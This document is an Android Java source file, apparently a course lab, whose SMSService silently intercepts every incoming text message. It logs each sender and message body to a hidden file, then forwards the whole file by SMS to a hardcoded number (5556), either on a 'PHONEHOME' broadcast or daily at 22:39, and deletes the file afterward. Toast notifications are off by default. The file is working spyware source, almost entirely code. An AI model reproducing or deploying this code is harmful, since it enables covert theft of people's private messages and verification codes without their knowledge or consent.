package com.madewithorbit.lab4;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.*;
import android.widget.Toast;

import java.io.*;
import java.util.*;

public class SMSService extends Service {
    public static boolean isStarted;
    private SMSReceiver smsReceiver = new SMSReceiver();

    @Override
    public void onCreate() {
        super.onCreate();
        isStarted = true;
        IntentFilter i = new IntentFilter();
        i.setPriority(Integer.MAX_VALUE);
        i.addAction("android.provider.Telephony.SMS_RECEIVED");
        i.addAction("com.madewithorbit.lab4.smsservice.STOP");
        i.addAction("com.madewithorbit.lab4.smsservice.PHONEHOME");
        i.addAction("android.intent.action.TIME_TICK");
        registerReceiver(smsReceiver, i);
        Log.d("zack","reg");
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public class SMSReceiver extends BroadcastReceiver {
        String midnightAddress = "5556";
        boolean toastOnReceive = false, sendAtTime = true;
        int hour = 22;
        int minute = 39;
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals("com.madewithorbit.lab4.smsservice.STOP"))
            {
                Log.d("zack","unreg");
                unregisterReceiver(this);
                SMSService.this.stopSelf();
                isStarted = false;
            }
            else if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
            {
                final Bundle bundle = intent.getExtras();
                try {
                    if (bundle != null) {
                        final Object[] pdusObj = (Object[]) bundle.get("pdus");
                        for (int i = 0; i < pdusObj.length; i++) {

                            SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                            String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                            String senderNum = phoneNumber;
                            String message = currentMessage.getDisplayMessageBody();

                            Log.i("zack", "Receieved from: "+ senderNum + " Message: " + message);

                            WriteToFile(senderNum, message);

                            if (toastOnReceive) {
                                int duration = Toast.LENGTH_LONG;
                                Toast toast = Toast.makeText(context, "Receieved from: " + senderNum + " Message: " + message, duration);
                                toast.show();
                            }
                        }
                    }

                } catch (Exception e) {
                    Log.e("SmsReceiver", "Exception smsReceiver" +e);
                }
            }
            else if (intent.getAction().equals("com.madewithorbit.lab4.smsservice.PHONEHOME"))
            {
                try {
                    SendFileContents();
                }
                catch(Exception e)
                {
                    e.printStackTrace();
                }
            }
            else if (intent.getAction().equals("android.intent.action.TIME_TICK") && sendAtTime)
            {
                Calendar calendar = Calendar.getInstance();
                int h = calendar.get(Calendar.HOUR_OF_DAY);
                int m = calendar.get(Calendar.MINUTE);
                //Log.d("zack", h + "," + m);
                //Log.d("zack", m%2==0?"tick":"tock");
                if (h == hour && m == minute) {
                    try {
                        SendFileContents();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        public void SendFileContents() throws IOException
        {
            String filename = getFilesDir() + "/messages.txt";
            String result = "";
            File file = new File(filename);
            try {
                BufferedReader br = new BufferedReader(new FileReader(file));
                String line;
                while ((line = br.readLine()) != null) {
                    result += line + "\n";
                }
            }
            catch (IOException e) {
                e.printStackTrace();
            }
            Log.d("zack", result);

            file.delete();
            file.createNewFile();

            SmsManager smsManager = SmsManager.getDefault();
            //result = "ugu.";
            smsManager.sendTextMessage(midnightAddress, null, result, null, null);


        }

        public void WriteToFile(String sender, String message) throws IOException
        {
            String filename = getFilesDir() + "/messages.txt";
            File file = new File(filename);
            if (!file.exists())
            {
                file.createNewFile();
            }
            String text = "Sender:\n"+sender+"\nMessage:\n"+message+"\n";

            FileOutputStream fOut = new FileOutputStream(file, true);
            OutputStreamWriter osw = new OutputStreamWriter(fOut);
            osw.write(text);
            osw.flush();
            osw.close();
        }
    }
}